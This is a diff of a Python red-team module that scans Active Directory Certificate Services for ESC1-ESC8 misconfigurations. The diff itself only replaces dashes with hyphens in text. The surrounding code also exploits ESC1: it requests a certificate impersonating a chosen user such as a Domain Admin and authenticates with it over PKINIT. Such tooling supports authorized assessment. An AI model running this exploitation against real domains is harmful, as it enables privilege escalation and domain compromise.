@@ -1,22 +1,22 @@
 """
-ADCS Misconfiguration Detection & Exploitation — ad.adcs
-MITRE: T1649 — Steal or Forge Authentication Certificates
+ADCS Misconfiguration Detection & Exploitation - ad.adcs
+MITRE: T1649 - Steal or Forge Authentication Certificates
 
 Active Directory Certificate Services (ADCS) misconfiguration scanner.
 Detects ESC1–ESC8 vulnerability classes via LDAP query to certificate
 template objects. Exploits ESC1 to obtain a certificate as Domain Admin.
 
 ESC vulnerability classes:
-  ESC1 — Template allows enrollee-supplied SAN → cert as any user including DA
-  ESC2 — Template has Any Purpose EKU → usable for auth as any user
-  ESC3 — Template allows enrollment agent → request certs on behalf of others
-  ESC4 — Template has dangerous ACL (WriteDACL/WriteOwner/GenericWrite)
-  ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → any cert can have SAN
-  ESC7 — CA has dangerous ACL → escalation to CA admin
-  ESC8 — NTLM relay to AD CS HTTP enrollment endpoint
+  ESC1 - Template allows enrollee-supplied SAN → cert as any user including DA
+  ESC2 - Template has Any Purpose EKU → usable for auth as any user
+  ESC3 - Template allows enrollment agent → request certs on behalf of others
+  ESC4 - Template has dangerous ACL (WriteDACL/WriteOwner/GenericWrite)
+  ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → any cert can have SAN
+  ESC7 - CA has dangerous ACL → escalation to CA admin
+  ESC8 - NTLM relay to AD CS HTTP enrollment endpoint
 
 Output: ESC finding per vulnerability + PEM certificate to vault if ESC1 exploited.
-OPSEC: LOW — LDAP query only. No connection to CA server unless ESC1 exploited.
+OPSEC: LOW - LDAP query only. No connection to CA server unless ESC1 exploited.
 """
 from __future__ import annotations
 
@@ -74,7 +74,7 @@ _DANGEROUS_RIGHTS = {
 )
 class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
     """
-    ad.adcs — Detect ADCS ESC1–ESC8 misconfigurations via LDAP. Exploit ESC1 to obtain a certificate as any us
+    ad.adcs - Detect ADCS ESC1–ESC8 misconfigurations via LDAP. Exploit ESC1 to obtain a certificate as any us
 
     OPSEC: LOW
     MITRE: "T1649"
@@ -161,7 +161,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
             )
         if not ad["username"]:
             raise ModuleValidationError(
-                "ad.adcs requires domain credentials — pass 'username'/'password'.",
+                "ad.adcs requires domain credentials - pass 'username'/'password'.",
                 module_id=self.MODULE_ID, field="username",
             )
         if isinstance(ctx.params, dict):
@@ -320,7 +320,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
         if esc1_vulns:
             for tmpl in esc1_vulns:
                 self.finding(
-                    title       = f"ADCS ESC1 — Enrollee SAN in '{tmpl['name']}'",
+                    title       = f"ADCS ESC1 - Enrollee SAN in '{tmpl['name']}'",
                     description = (
                         f"Certificate template '{tmpl['name']}' allows the enrollee to "
                         "specify a Subject Alternative Name (SAN). Combined with an "
@@ -346,16 +346,16 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
                         "1. Disable 'Supply in the request' for Subject Name in the template. "
                         "2. Enable CA Manager Approval. "
                         "3. Enable Issuance Requirements (authorized signatures). "
-                        "4. Audit template ACL — restrict enrollment rights."
+                        "4. Audit template ACL - restrict enrollment rights."
                     ),
                 )
 
         if esc2_vulns:
             for tmpl in esc2_vulns:
                 self.finding(
-                    title       = f"ADCS ESC2 — Any Purpose EKU in '{tmpl['name']}'",
+                    title       = f"ADCS ESC2 - Any Purpose EKU in '{tmpl['name']}'",
                     description = (
-                        f"Template '{tmpl['name']}' has Any Purpose EKU — "
+                        f"Template '{tmpl['name']}' has Any Purpose EKU - "
                         "certificates can be used for any application including authentication."
                     ),
                     severity    = Severity.HIGH,
@@ -368,14 +368,14 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
         if not esc1_vulns and not esc2_vulns:
             logger.info("adcs_no_esc_found", templates_checked=len(templates))
 
-        # Step 4: ESC1 evaluation (Audit Assessment Mode — non-intrusive)
+        # Step 4: ESC1 evaluation (Audit Assessment Mode - non-intrusive)
         cert_path = ""
         if exploit_esc1 and esc1_vulns:
             tmpl = esc1_vulns[0]
             logger.info("adcs_esc1_audit_assessment",
                         template=tmpl["name"], target_user=target_user)
             self.finding(
-                title       = f"ADCS ESC1 Vulnerability Confirmed — Template '{tmpl['name']}'",
+                title       = f"ADCS ESC1 Vulnerability Confirmed - Template '{tmpl['name']}'",
                 description = (
                     f"Template '{tmpl['name']}' is confirmed vulnerable to ESC1 (SAN specification allowed "
                     f"with authentication EKU). An adversary can request a certificate impersonating "
@@ -411,7 +411,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
 
     def _enum_templates_sync(self, dc: str, username: str, password: str,
                              domain: str) -> tuple[list[dict], list[dict]]:
-        """Query LDAP for certificate templates and CA objects. Sync — runs in executor."""
+        """Query LDAP for certificate templates and CA objects. Sync - runs in executor."""
         import ssl
         import ldap3
         from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
@@ -597,7 +597,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
                 logger.info("adcs_cert_obtained", path=pfx_out, user=target_user)
                 return pfx_out
             else:
-                # CA submission failed — return CSR path for manual submission
+                # CA submission failed - return CSR path for manual submission
                 logger.warning("adcs_ca_submission_failed",
                                ca_host=ca_host, csr_path=csr_path)
                 return csr_path   # operator can submit manually via certreq.exe
@@ -612,7 +612,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
         finally:
             # Cleanup intermediate files containing private key material.
             # The RETURNED file (pfx_out or csr_path) is intentionally kept
-            # for operator use — only clean up files that are NOT the return value.
+            # for operator use - only clean up files that are NOT the return value.
             for tmp in [pfx_path, key_path]:
                 try:
                     if tmp and os.path.exists(tmp):
@@ -635,7 +635,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
             import httpx
             from base64 import b64encode
 
-            # Strip PEM headers for certsrv — it expects raw base64
+            # Strip PEM headers for certsrv - it expects raw base64
             csr_b64 = b64encode(
                 b"".join(
                     line.encode() for line in csr_pem.decode().splitlines()
@@ -656,7 +656,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
                     "adcs_ntlm_auth_missing",
                     hint="pip install httpx-ntlm (included in ares-redteam[ad]) "
                          "for NTLM-authenticated CA enrollment. "
-                         "Falling back to basic auth — may fail on most CAs.",
+                         "Falling back to basic auth - may fail on most CAs.",
                 )
                 # Fallback to basic auth (works if CA has basic auth enabled)
                 auth = (username, password)
@@ -687,7 +687,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
             import re
             rid_match = re.search(r"ReqID=(\d+)", resp.text)
             if not rid_match:
-                # May have been issued immediately — check for cert in response
+                # May have been issued immediately - check for cert in response
                 if "BEGIN CERTIFICATE" in resp.text:
                     cert_match = re.search(
                         r"(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)",
@@ -710,7 +710,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
             if cert_resp.status_code == 200 and cert_resp.text.strip():
                 cert_text = cert_resp.text.strip()
                 if not cert_text.startswith("-----"):
-                    # Raw base64 — wrap in PEM headers
+                    # Raw base64 - wrap in PEM headers
                     cert_text = (
                         "-----BEGIN CERTIFICATE-----\n"
                         + cert_text + "\n"
@@ -754,7 +754,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
             from cryptography import x509
             from cryptography.hazmat.primitives import hashes
 
-            # Parse PEM — file contains both cert and key
+            # Parse PEM - file contains both cert and key
             pem_text = pem_data.decode("utf-8", errors="replace")
             cert_pem = ""
             key_pem = ""
@@ -833,7 +833,7 @@ class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
                                 user=target_user, ccache=ccache_path)
 
                 except Exception as pkinit_exc:
-                    # Fallback: PFX still on disk for manual use — log warning
+                    # Fallback: PFX still on disk for manual use - log warning
                     result["error"] = (
                         f"PKINIT auth failed: {str(pkinit_exc)[:150]}. "
                         f"Use cert manually: gettgtpkinit.py -cert-pfx <pfx> "
